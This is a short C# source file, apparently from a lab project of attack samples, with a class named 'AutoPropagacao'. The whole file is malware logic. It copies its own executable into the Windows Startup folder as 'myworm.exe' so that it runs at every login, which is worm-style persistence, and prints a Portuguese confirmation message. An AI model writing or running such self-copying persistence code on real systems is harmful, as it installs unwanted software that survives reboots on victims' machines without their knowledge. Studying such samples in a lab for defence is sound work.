using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Laboratorio.Attacks.App.Attacks
{
    public class AutoPropagacao
    {

        public static void Propagar()
        {
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string dest = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\myworm.exe";

            File.Copy(exePath, dest, true);
            Console.WriteLine("Cópia criada na inicialização.");
        }
    }
}
